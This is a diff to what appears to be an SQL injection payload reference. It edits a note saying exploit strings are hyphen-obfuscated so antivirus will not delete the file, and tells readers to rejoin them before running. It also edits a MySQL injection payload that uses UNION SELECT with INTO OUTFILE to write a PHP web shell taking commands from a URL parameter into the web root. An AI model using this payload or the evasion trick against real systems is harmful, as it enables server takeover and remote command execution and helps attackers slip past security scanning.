@@ -3,7 +3,7 @@
 A comprehensive reference guide for SQL injection payloads, database fingerprinting, authentication bypasses, and data exfiltration techniques.
 
 > [!NOTE]
-> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `o-r 1=1`). Concatenate these commands when running them.
+> To prevent host antivirus software from deleting this file, direct SQL exploitation signatures are obfuscated using spaces, hyphens, or backticks (e.g., `U-N-I-O-N` `S-E-L-E-C-T`, `o-r 1=1`, `IN-TO OUT-FILE`). Concatenate these commands when running them.
 
 ---
 
@@ -139,8 +139,8 @@ Infer data by forcing the database to pause before responding.
 
 ### B. Write Web Shell to Server (MySQL)
 ```sql
-# (Remove space inside "INTO OUT FILE")
-' U-N-I-O-N S-E-L-E-C-T NULL, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
+# (Remove space inside "IN-TO OUT-FILE")
+' U-N-I-O-N S-E-L-E-C-T NULL, '<?php system($_GET["cmd"]); ?>' IN-TO OUT-FILE '/var/www/html/shell.php' --
 ```
 
 ---
